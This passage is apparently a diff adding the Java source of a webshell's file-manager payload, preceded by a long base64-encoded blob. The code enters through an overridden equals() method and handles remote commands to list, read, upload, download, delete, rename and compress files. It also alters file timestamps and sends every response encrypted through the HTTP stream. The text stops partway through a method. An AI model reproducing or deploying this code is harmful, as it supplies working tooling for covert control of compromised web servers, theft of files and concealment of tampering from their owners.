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";
+        this.osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
+    }
+
+    public boolean equals(Object obj) {
+        Map<String, String> result = new HashMap();
+        try {
+            try {
+                fillContext(obj);
+                if (mode.equalsIgnoreCase("list")) {
+                    result.put("msg", list());
+                    result.put("status", "success");
+                } else if (mode.equalsIgnoreCase("show")) {
+                    result.put("msg", show());
+                    result.put("status", "success");
+                } else if (mode.equalsIgnoreCase("checkExist")) {
+                    result.put("msg", checkExist(path));
+                    result.put("status", "success");
+                } else if (mode.equalsIgnoreCase("delete")) {
+                    result = delete();
+                } else if (mode.equalsIgnoreCase("create")) {
+                    result.put("msg", create());
+                    result.put("status", "success");
+                } else if (mode.equalsIgnoreCase("append")) {
+                    result.put("msg", append());
+                    result.put("status", "success");
+                } else if (mode.equalsIgnoreCase("update")) {
+                    updateFile();
+                    result.put("msg", "ok");
+                    result.put("status", "success");
+                } else if (mode.equalsIgnoreCase("downloadPart")) {
+                    result.put("msg", downloadPart(path, Long.parseLong(blockIndex), Long.parseLong(blockSize)));
+                    result.put("status", "success");
+                } else {
+                    if (mode.equalsIgnoreCase("download")) {
+                        download();
+                        try {
+                            Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
+                            Method write = so.getClass().getMethod("write", byte[].class);
+                            write.invoke(so, Encrypt(buildJson(result, true).getBytes("UTF-8")));
+                            so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
+                            so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
+                        return true;
+                    }
+                    if (mode.equalsIgnoreCase("rename")) {
+                        result = renameFile();
+                    } else if (mode.equalsIgnoreCase("createFile")) {
+                        result.put("msg", createFile());
+                        result.put("status", "success");
+                    } else if (mode.equalsIgnoreCase("compress")) {
+                        zipFile(path, true);
+                        result.put("msg", "ok");
+                        result.put("status", "success");
+                    } else if (mode.equalsIgnoreCase("createDirectory")) {
+                        result.put("msg", createDirectory());
+                        result.put("status", "success");
+                    } else if (mode.equalsIgnoreCase("getTimeStamp")) {
+                        result.put("msg", getTimeStamp());
+                        result.put("status", "success");
+                    } else if (mode.equalsIgnoreCase("updateTimeStamp")) {
+                        result.put("msg", updateTimeStamp());
+                        result.put("status", "success");
+                    } else if (mode.equalsIgnoreCase("check")) {
+                        result.put("msg", checkFileHash(path));
+                        result.put("status", "success");
+                    }
+                }
+                try {
+                    Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
+                    Method write2 = so2.getClass().getMethod("write", byte[].class);
+                    write2.invoke(so2, Encrypt(buildJson(result, true).getBytes("UTF-8")));
+                    so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
+                    so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
+                    return true;
+                } catch (Exception e2) {
+                    e2.printStackTrace();
+                    return true;
+                }
+            } catch (Throwable e3) {
+                e3.printStackTrace();
+                result.put("msg", e3.getMessage());
+                result.put("status", "fail");
+                try {
+                    Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
+                    Method write3 = so3.getClass().getMethod("write", byte[].class);
+                    write3.invoke(so3, Encrypt(buildJson(result, true).getBytes("UTF-8")));
+                    so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
+                    so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
+                    return true;
+                } catch (Exception e4) {
+                    e4.printStackTrace();
+                    return true;
+                }
+            }
+        } catch (Throwable th) {
+            try {
+                Object so4 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
+                Method write4 = so4.getClass().getMethod("write", byte[].class);
+                write4.invoke(so4, Encrypt(buildJson(result, true).getBytes("UTF-8")));
+                so4.getClass().getMethod("flush", new Class[0]).invoke(so4, new Object[0]);
+                so4.getClass().getMethod("close", new Class[0]).invoke(so4, new Object[0]);
+            } catch (Exception e5) {
+                e5.printStackTrace();
+            }
+            throw th;
+        }
+    }
+
+    private String checkFileHash(String path2) throws Exception {
+        FileChannel ch = (FileChannel) sessionGetAttribute(this.Session, path2);
+        if (ch != null && ch.isOpen()) {
+            ch.close();
+        }
+        byte[] input = getFileData(path2);
+        if (input == null || input.length == 0) {
+            return null;
+        }
+        MessageDigest md5 = MessageDigest.getInstance("MD5");
+        md5.update(input);
+        byte[] byteArray = md5.digest();
+        StringBuilder sb = new StringBuilder();
+        for (byte b : byteArray) {
+            sb.append(String.format("%02x", Byte.valueOf(b)));
+        }
+        return sb.substring(0, 16);
+    }
+
+    private void updateFile() throws Exception {
+        FileChannel ch = (FileChannel) sessionGetAttribute(this.Session, path);
+        if (ch == null) {
+            FileOutputStream fos = new FileOutputStream(path);
+            ch = fos.getChannel();
+            sessionSetAttribute(this.Session, "fos", fos);
+            sessionSetAttribute(this.Session, path, ch);
+        }
+        synchronized (ch) {
+            ch.position(Integer.parseInt(blockIndex) * Integer.parseInt(blockSize));
+            ch.write(ByteBuffer.wrap(base64decode(content)));
+        }
+    }
+
+    private Map<String, String> warpFileObj(File file) {
+        Map<String, String> obj = new HashMap<>();
+        obj.put("type", file.isDirectory() ? "directory" : "file");
+        obj.put("name", file.getName());
+        obj.put("size", file.length() + "");
+        obj.put("perm", getFilePerm(file));
+        obj.put("lastModified", new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date(file.lastModified())));
+        return obj;
+    }
+
+    private boolean isOldJava() {
+        String version = System.getProperty("java.version");
+        if (version.compareTo("1.7") >= 0) {
+            return false;
+        }
+        return true;
+    }
+
+    private String checkExist(String path2) throws Exception {
+        File file = new File(path2);
+        if (file.exists()) {
+            return file.length() + "";
+        }
+        throw new Exception("");
+    }
+
+    private String getFilePerm(File file) {
+        String permStr = "";
+        if (isWindows()) {
+            try {
+                permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/" + (file.canExecute() ? "E" : "-");
+            } catch (Error e) {
+                permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/-";
+            }
+        } else {
+            String version = System.getProperty("java.version");
+            if (version.compareTo("1.7") >= 0) {
+                try {
+                    getClass();
+                    Class<?> cls = Class.forName("java.nio.file.Files");
+                    getClass();
+                    Class<?> cls2 = Class.forName("java.nio.file.attribute.PosixFileAttributes");
+                    getClass();
+                    Class<?> cls3 = Class.forName("java.nio.file.Paths");
+                    getClass();
+                    Class<?> cls4 = Class.forName("java.nio.file.attribute.PosixFilePermissions");
+                    Object f = cls3.getMethod("get", String.class, String[].class).invoke(cls3.getClass(), file.getAbsolutePath(), new String[0]);
+                    Object attrs = cls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(cls, f, cls2, new LinkOption[0]);
+                    Object result = cls4.getMethod("toString", Set.class).invoke(cls4, cls2.getMethod("permissions", new Class[0]).invoke(attrs, new Object[0]));
+                    permStr = result.toString();
+                } catch (Exception e2) {
+                }
+            } else {
+                permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/" + (file.canExecute() ? "E" : "-");
+            }
+        }
+        return permStr;
+    }
+
+    private String list() throws Exception {
+        File f = new File(path);
+        List<Map<String, String>> objArr = new ArrayList<>();
+        objArr.add(warpFileObj(new File(".")));
+        objArr.add(warpFileObj(new File("..")));
+        if (f.isDirectory() && f.listFiles() != null) {
+            for (File temp : f.listFiles()) {
+                objArr.add(warpFileObj(temp));
+            }
+        }
+        String result = buildJsonArray(objArr, true);
+        return result;
+    }
+
+    private String show() throws Exception {
+        byte[] fileContent = getFileData(path);
+        return base64encode(fileContent);
+    }
+
+    private byte[] getFileData(String path2) throws IOException {
+        ByteArrayOutputStream output = new ByteArrayOutputStream();
+        FileInputStream fis = new FileInputStream(new File(path2));
+        while (true) {
+            int data = fis.read();
+            if (data != -1) {
+                output.write(data);
+            } else {
+                fis.close();
+                return output.toByteArray();
+            }
+        }
+    }
+
+    private String create() throws Exception {
+        FileOutputStream fso = new FileOutputStream(path);
+        fso.write(base64decode(content));
+        fso.flush();
+        fso.close();
+        String result = path + "上传完成，远程文件大小:" + new File(path).length();
+        return result;
+    }
+
+    private Map<String, String> renameFile() throws Exception {
+        Map<String, String> result = new HashMap<>();
+        File oldFile = new File(path);
+        File newFile = new File(newPath);
+        if (oldFile.exists() && (oldFile.isFile() & oldFile.renameTo(newFile))) {
+            result.put("status", "success");
+            result.put("msg", "重命名完成:" + newPath);
+        } else {
